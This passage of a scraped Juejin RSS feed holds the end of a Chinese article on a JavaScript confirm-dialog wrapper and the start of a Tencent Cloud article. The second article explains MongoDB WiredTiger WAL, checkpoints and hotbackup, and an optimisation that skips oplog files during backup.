      <span class="hljs-keyword">await</span> <span class="hljs-title class_">ConfirmMessage</span>.<span class="hljs-title function_">confirm</span>(options?.<span class="hljs-property">message</span>, options);
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">callback</span>(...args);
      <span class="hljs-comment">// 修改状态...</span>
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);
    }
  };
};

</code></pre>
<h2 data-id="heading-11">总结 &amp; 问题</h2>
<ol>
<li>示例中的自定义命令式弹窗组件有一个问题，就是没有卸载组件，每次调用 <strong>confirm</strong> 时都会创建一个新的 <strong>dialog</strong> 而旧的未销毁，大家也可以分享一下该如何处理，或指正一下我是否写的有问题。我用 <strong>render(null,container)</strong> 跟 <strong>container.remove()</strong> 也无法销毁。</li>
<li>大家会发现实际上封装一个这样的流程处理函数并不是难事，难的是我们在开发的过程中是否能够想到这些代码优化的方式。我也是看到了其他大佬的分享才学到了这些知识并应用在了实际工作中。如有问题大家一起讨论学习。后续我还会出一个通用的错误流程处理函数跟这个是类似的。</li>
<li>大家如果有一些工作中比较实用的一些编码思维等等，也可以一起分享出来学习学习。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[「腾讯云NoSQL」技术之 MongoDB 篇:MongoDB 存储引擎备份性能70%提升内幕揭秘]]></title>    <link>https://juejin.cn/post/7575751471841869860</link>    <guid>https://juejin.cn/post/7575751471841869860</guid>    <pubDate>2025-11-24T03:06:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471841869860" data-draft-id="7575937594350026795" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="「腾讯云NoSQL」技术之 MongoDB 篇:MongoDB 存储引擎备份性能70%提升内幕揭秘"/> <meta itemprop="keywords" content="数据库,NoSQL"/> <meta itemprop="datePublished" content="2025-11-24T03:06:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="腾讯云数据库"/> <meta itemprop="url" content="https://juejin.cn/user/3227821871466094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            「腾讯云NoSQL」技术之 MongoDB 篇:MongoDB 存储引擎备份性能70%提升内幕揭秘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821871466094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    腾讯云数据库
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:06:15.000Z" title="Mon Nov 24 2025 03:06:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0cd903f8a5347a798f6b608a180da52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=W9YE8r%2BcI9PAYKrbmVSEEOigFzk%3D" alt="图片" loading="lazy"/></p>
<blockquote>
<p>在非结构化数据爆炸式增长的今天，MongoDB 凭借其灵活的文档模型与分布式集群架构成为游戏行业高并发场景的首选数据库。然而，在大文档场景，oplog 的备份和回档长期存在效率瓶颈——传统备份方式需全量拷贝数据目录，导致资源浪费。基于以上业务痛点，腾讯云 NoSQL 与内核团队深入解析 WiredTiger 存储引擎原理，新增 exclude_target 功能，通过智能识别并跳过冗余的无用 oplog.wt 文件，实现备份耗时、存储成本及网络带宽的70%缩减，为游戏、电商等高并发场景提供更高效的运维支持。</p>
<p>作者：腾讯云NoSQL团队-杨亚洲、尹超</p>
</blockquote>
<p>线上有部分 MongoDB 业务，因其业务独特性产生了海量的非结构化数据（如游戏日志、用户行为记录等），常面临文档大、更新写入频繁的挑战。为了存储足够的oplog ，运维人员往往需要将 oplog size 设置得比较大，甚至远远超过了业务数据本身的大小。MongoDB 物理备份基于 wiredTiger 存储 backup 功能实现，该功能主要拷贝数据目录中的所有 wt 文件，包括用户数据文件、oplog 、系统 wt 文件等。</p>
<p>数据目录中所有 wt 文件越大，客户的物理备份及回档时间也就越长，下面以某核心游戏业务为例进行说明，该业务对应实例不同 wt 文件数据量总结如下：</p>
<p><strong><strong>●</strong> 真实业务数据大小：230G</strong></p>
<p><strong><strong>●</strong> Admin 、config 等系统数据大小：&lt; 1G</strong></p>
<p><strong><strong>●</strong> Oplog 大小(oplog.rs 表)： 515G</strong></p>
<p>从上面的统计可以看出，oplog 数据大小占比约70%。由于社区 MongoDB 存储引擎的 backup 物理备份功能必须对数据目录所有文件做备份，回档才会成功，这意味着每次备份都有大量资源浪费在重复备份 oplog 上，导致备份和回档时间过长，存储成本和网络带宽消耗巨大。</p>
<p>基于以上的业务痛点，腾讯云对 MongoDB 存储引擎的 backup 做了一次深入分析及优化，基于 wiredTiger 存储引擎 backup 新增 exclude_target 功能，该功能可以忽略备份指定 wt 文件，同时可以做到只基于用户数据文件正常启动 mongoDB ，从而确保回档成功。</p>
<p><strong>腾讯云 MongoDB 优化后的物理备份回档直接带来了显著的性能提升:</strong></p>
<p><strong><strong>●</strong>  备份耗时：减少70%</strong></p>
<p><strong><strong>●</strong>  回档耗时：减少70%</strong></p>
<p><strong><strong>●</strong>  存储成本：节省70%</strong></p>
<p><strong><strong>●</strong> 网络带宽占用：减少70%</strong></p>
<h2 data-id="heading-0"><strong>1 腾讯云物理备份回档原理</strong></h2>
<p>腾讯云 MongoDB 物理备份基于 wiredTiger 存储引擎的 hotbackup 功能实现，该功能底层以 checkpoint 检测点实现节点的完整数据快照。物理备份期间，会通过物理拷贝的方式拷贝整个数据目录中的所有文件存入腾讯云 cos 对象存储，数据文件越大，整个全量备份耗时就会越长。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3527b2bbb51d4da6bc3f70ea6dc14215~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=SZtEtnm0B7x8BL97xjI4TXHAjP0%3D" alt="image.png" loading="lazy"/></p>
<p>同理，当对整个实例进行整实例回档的时候，我们需要从 cos 下载前面备份的所有 wt 数据文件，总文件越大，下载也会越耗时。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b623ce96972449ecb75ad94ac4698c6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=rWSEDkgCwdxHQzcqsL%2FKqhQ6qlA%3D" alt="image.png" loading="lazy"/></p>
<p>从上面的备份和回档流程可以看出，全量物理备份的时候我们需要拷贝 oplog.wt 到 cos , 下载的时候也需要从 cos 下载这个 oplog.wt 文件。</p>
<p>Oplog.wt 物理文件中存储的是历史增量数据，主要用于主从数据同步和增量逻辑备份。回档从 cos 下载完全量物理备份数据到3个节点，然后通过这3个节点构建副本集一致状态，这些用户数据表 .wt+ 其他内部表 .wt 可以决定这个全量一致状态，因此 oplog.wt 对构建副本集是无用数据。</p>
<p>此外腾讯云 MongoDB 团队也会逻辑实时备份 oplog.rs 表中的增量数据到 cos 对象存储，通过上面实例构建完的一致状态 +oplog.rs 增量数据的逻辑回放可以保证快速恢复数据到任意时间点。通过 oplog.rs 表实时逻辑备份的数据实际上和物理 oplog.wt 文件中的内容是重复的，oplog.rs 逻辑备份的数据包含了 oplog.wt 中的数据，因此再一次证明 oplog.wt 是重复的无用wt文件。</p>
<p>说明：为了便于理解，这里直接用表名 .wt 来表示该表对应磁盘上的 wt 文件，实际上表对应的 wt 文件名在 mongo server 层做了一次转换。实际对应关系可以通过 db. 表名 .stats().wi redTiger.uri 获取，以 oplog.wt 为例，它对应磁盘的文件路径如下:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c46aacaa43af466aa210325ab73e8e51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=OVUXdVcuxVZEm328YfLklyN5uQA%3D" alt="image.png" loading="lazy"/>
本文基于以上背景，通过 MongoDB 内核支持忽略 oplog.wt 的备份和回档，从而让该游戏核心客户的全量备份回档时间提速70%。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9535960692cc4b8aabe1cf7def550446~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=uhhGSV5C9JtAiD1f6iTZYqroc7A%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">2 wiredTiger 存储引擎数据持久化及恢复原理</h2>
<p>wiredTiger 存储引擎的 hotbackup 功能以 wt 的 checkpoint 检测点为基础。单节点故障恢复除了依赖 checkpoint ，同时也依赖 WAL 。</p>
<h3 data-id="heading-2">2.1 WAL</h3>
<p>先简单了解下 WAL 的一些理论说明， WAL（预写日志系统，（ Write-ahead logging ，缩写 WAL ））是数据库管理系统**实现事务持久性与故障恢复的核心机制，通过“先记录日志后修改数据”的原则确保事务原子性和数据一致性。</p>
<h4 data-id="heading-3">2.1.1 为什么需要 WAL</h4>
<p>假设以下场景：当用户写数据到 MongoDB 时内存很充足，所有的 KV 数据会存储在 wiredTiger 存储引擎的 B+ tree 中，写入10条普通 KV 数据后，因此 wt 的 dirty 指标很低，因此不会触发 B+ tree 的 page evict 操作，写入内存后就会返回客户端OK ，此时 B+ tree 的数据全部在内存中，还没有持久化。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b93775f0a1343d0bf39821a77d57107~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=Zi%2FGace%2B4%2F%2FLRtfDrIQwKLRPIoA%3D" alt="image.png" loading="lazy"/></p>
<p>如果这时候机器故障或者 mongod 故障节点挂掉了，重启节点后，由于数据没有持久化到磁盘，因此重启后数据就会丢失，如下图。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d12d89c61ca942199f87c59b482d1b6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=WCTCagxB3aYsf%2FlYb6BW6179VeU%3D" alt="image.png" loading="lazy"/></p>
<p>基于以上背景，因此就有了 WAL 模块的存在，在数据写入到 B+ tree 前，会提前写 WAL 日志，每个写事物对应一个完整 wal 日志，这样当服务器异常重启或者进程重启的时候，就可以通过 WAL 顺序回放这些日志完成数据恢复。Mongod 的 WAL 数据存储在 journal 目录中：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bc4b235186645af8e66fd5ac6df7cb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=MbpjT%2F4hPnyQUNs1L4uzMPvJ3jA%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-4">2.1.2 如果只有 WAL 会有什么问题</h4>
<p>假设只依赖 wal 进行异常数据恢复，将存在以下问题：</p>
<p><strong>● 数据恢复慢</strong></p>
<p>Wal 的恢复流程：顺序读取每一个 WiredTigerLog.xx 文件，然后读取文件中的内容一行一行进行回放，如果 journal 目录中 WiredTigerLog.xx 文件很多，那么恢复速度就会越慢。</p>
<p><strong>● 数据放大严重</strong></p>
<p>假设我们只有一条数据，并且对这条数据 update 了几亿次操作，那么 wal 文件中会记录几亿次变更过程，磁盘占用空间会膨胀几亿倍。</p>
<p><strong>● 消耗大量文件句柄</strong></p>
<p>Wiredtiger 默认 WiredTigerLog.xx 文件大小100M，上T数据将用掉上万个文件句柄。</p>
<h3 data-id="heading-5">2.2 Checkpoint</h3>
<p>为了解决 WAL 的以上痛点，因此引入 checkpoint 机制，MongoDB 的 checkpoint 模块功能主要由 wiredTiger 存储引擎完成。</p>
<h4 data-id="heading-6">2.2.1 Checkpoint 核心原理</h4>
<p>Checkpoint 主要把当前 B+ tree 中所有可见脏 page 持久化到磁盘，从而实现一个完整数据快照。下面以一个完整的 checkpoint 流程为例进行说明(说明：为了简化，这里用一个方框来代表一个 page ，实际 B+ tree 这里还涉及ref相关数据结构)：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cf09173192f43a29a9a890b62ce356a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=1ycwRU7SInXNEwXq0KfoqERFK0s%3D" alt="image.png" loading="lazy"/></p>
<p>如上图所示，假设当前用户写入数据量不大，并且没有触发 evict** ，那么所有用户page 数据都在内存中。当做 checkpoint 的时候，checkpoint 线程会遍历整个 b+ tree 中的可见 page，由于之前这棵 tree 中的所有 page 都没有持久化过，因此对 checkpoint 线程来说这些 page 都是脏 page 。持久化到磁盘后的状态大体如下:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3796b05fc5c24012be29f78f578310ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=74Qhjxitk0bFJMqXxnpzzYmnglE%3D" alt="image.png" loading="lazy"/>
第一次 checkpoint 完成后，假设更新了 leaf_page_1 中的数据，然后 checkpoint 线程进行第二次 checkpoint 操作，这时候的数据分别状态如下图:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1597170baab4cc6b9fc24ec00cbaff3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=cabTtNDooFnyucEZlIqgkqQdaJs%3D" alt="image.png" loading="lazy"/></p>
<p>最终两次 checkpoint 后，collection.wt 中包含了两次 checkpoint 的全部用户数据和 ext 元数据，每个 checkpoint 都对应一棵完整的 b+ tree，假设第一次 checkpoint 对应 checkpoint_1，第二次 checkpoint 对应 checkpoint_2, 则：</p>
<p>Checkpoint_1 = leaf_page_1 + leaf_page_2 + internal_page_1 + leaf_page_3 + leaf_page_4 + internal_page_2 +root_page</p>
<p>Checkpoint_2 = leaf_page_1(new) + leaf_page_2 + internal_page_1(new) + leaf_page_3 + leaf_page_4 + internal_page_2 +root_page(new)</p>
<p>当节点重启后，首先根据 WiredTiger.wt 元数据获取下图中的 checkpoint 信息，解析 checkpint 信息就可以获取到磁盘上的 root page，然后就可以逐层获取到整颗b+ tree 的所有 page。root page 就是通过 wiredTiger 启动时候解析WiredTiger.wt 文件中的 checkpoint 信息地址获取，如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a54765f79ceb4ddeab100b0b81fda515~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=uVxMWSB%2BMul%2BsnjHcsKKL9z%2FQn0%3D" alt="image.png" loading="lazy"/>
这里 checkpoint=(WiredTigerCheckpoint.1=</p>
<p>(addr="018181e4c6ff67d88281e41546bd168381e48372ae35808080e22fc0cfc0")的 addr 是编码后的字符串，通过解码这个 addr 字符串即可解析出 root page 在磁盘中的位置以及其他 ext meta，从而可以在内存中重新构建该 b+ tree。Checkpoint 解析后的内容如下:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c0503542d14485ca377189c282cd8c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=sUA8f1xMxNhJSdvuKG0OB2TmE2E%3D" alt="image.png" loading="lazy"/></p>
<p>wiredTiger 相关 checkpoint 配置主要有下面两个参数：</p>
<p>● Checkpoint.log_size</p>
<p>当上次 checkpoint 后，wal的log_size 增加到配置的指定大小，则会触发wiredTiger 的 checkpoint server 线程做 checkpoint 操作。</p>
<p>● Checkpoint.wait</p>
<p>如果长时间没有满足 log_size 的大小，当离上次 checkpoint 时间达到 wait 值，也会触发 checkpoint server 线程做 checkpoint 操作。</p>
<p>MongoDB 没有启用 wiredTiger 自带的 checkpoint server </p>
<p>线程做 checkpoint 操作，而是 Mongo server 层创建了一个 checkpoint 线程定期进行 checkpoint 操作，checkpoint 周期默认60秒，可以通过修改配置文件 storage.syncPeriodSecs参数进行修改。</p>
<h4 data-id="heading-7">2.2.2 Checkpoint + WAL 结合优势</h4>
<p>前面的 checkpoint 分析可以看出，节点重启的时候可以恢复到上一次开始做checkpoint 时候的全量数据快照，然后从这个 checkpoint 时间点回放对应 WAL 文件中的日志即可恢复数据到节点异常时间点，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc8edfd0fe01420396b391b5c6dda035~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=Hqb0gRixdPJY8X6LvvEqKyXJnSo%3D" alt="image.png" loading="lazy"/></p>
<p>一次 checkpoint 完成后，本次 checkpoint 时间点之前的 WAL 已经没用了，因此可以直接删除。最终节点重启后的数据恢复以最近一次 checkpoint 全量快照+checkpoint 时间点以后的 WAL 文件来恢复单机数据，其中：</p>
<p>● 全量数据</p>
<p>通过 checkpoint 时间点的快照，通过 WiredTiger.wt 元数据文件中的 checkpoint=(WiredTigerCheckpoint.1=(addr="018181e4c6ff67d88281e41546bd168381e48372ae35808080e22fc0cfc0")即可获取 checkpoint 开始时间点的全量数据。</p>
<p>● 增量数据</p>
<p>增量数据可以通过 checkpoint 时间点对应的 WAL 文件回放来完成，也就是图中的 WiredTigerLog.n-1 和 WiredTigerLog.n。</p>
<p>通过 checkpoint+WAL 的结合，彻底解决了之前只有 WAL 设计时候的恢复慢、数据量放大、句柄耗光等问题。</p>
<h2 data-id="heading-8">3 wiredTiger 存储引擎 hotbackup 核心原理及其优化</h2>
<h3 data-id="heading-9">3.1 wiredTiger 存储引擎 hotbackup 核心原理</h3>
<p>hotbackup 主要是完成物理 wt 文件的完整一致性拷贝，每个表都有自己的checkpoint.addr (这里面保存了 root 及其他 ext meta )信息，这些信息存储在WiredTiger.wt 元数据文件中。</p>
<p>通过 WiredTiger.wt 中的 checkpoint.addr 信息可以逐步在恢复整个 B+ tree 层级结构。除了这个关键信息外，这里还涉及到很多其他的元数据配置，例如创建表的时候可以指定以下参数:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6779e058ccef452db0a56873439fbcd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=s%2F3AFhjOaGtKhBzXiLdtnAo7PTY%3D" alt="image.png" loading="lazy"/></p>
<p>创建表的时候，如果修改了 type、prefix_compression 和 value_format 的默认配置，则 wiredTiger.wt 中会保存这些表的元数据，这些元数据必须和创建表时候保持一致，否则节点重启会失败。</p>
<p>此外，除了上面的元数据外，还需要备份 schema 配置元数据，并存储表名和这些元数据配置的对应关系。所有这些元数据配置完全一致后，就可以通过元数据加载表对应 wt 文件，然后从元数据文件中的 checkpoint.addr 信息读取 root 地址，最终用户数据也就构建到 B+ tree 结构中。</p>
<p>整个 backup 代码实现主要分为三个阶段：</p>
<p>● backup cursor 生成阶段</p>
<p>这个步骤主要完成 schema 配置生成、确定需要拷贝的物理文件加入 cursor** 的 list buffer、设置 backup 标识等。</p>
<p>● backup cursor 遍历阶段</p>
<p>这个步骤主要告知我们需要拷贝哪些文件，通过 backup cursor 确定需要拷贝的文件名。</p>
<p>lbackup cursor 结束阶段</p>
<p>这个阶段主要包括资源回收，清理 backup 标识等。</p>
<h4 data-id="heading-10">3.1.1 backup cursor 生成阶段(也可以称为 begin 阶段)</h4>
<p>这一阶段也叫 begin 阶段，begin 开始后会立马设置 backup 标识，标明当前正在做backup 操作。</p>
<p>该阶段会从 WiredTiger.wt 中读取所有" file:"相关的 wt 文件列表，这些列表对应具体的 wt 文件，也就是需要拷贝到 cos 对象存储的wt文件，被存储到 cursor list 数组中。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7440007e52d941549dc536ef2222def0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=FTAejUDvNyP5pq84dXz6B28SLpA%3D" alt="image.png" loading="lazy"/></p>
<p>List 是指针结构，指向的内容为数组，数组的每一个 elem 代表一个需要拷贝的 wt 文件。然后获取这些 wt 文件的元数据配置信息存入"WiredTiger.backup.tmp"文件中，当所有的 wt 文件 schemap 配置及元数据写入 tmp 文件完成后，会 rename 更名为“WiredTiger.backup，最终“WiredTiger.backup”内容大体如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dc7afbf3d0d414e951be44f5a3e10d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=RVQUJHMqFljIDuQq5QrXCvbSCp4%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-11">3.1.2 backup cursor 遍历阶段(也可以称为wt文件数据拷贝阶段)</h4>
<p>这一阶段遍历 list[]数组即可获取 list[]数组中的每一个 elem，也就是可以获取每一个需要备份的 wt 物理文件。</p>
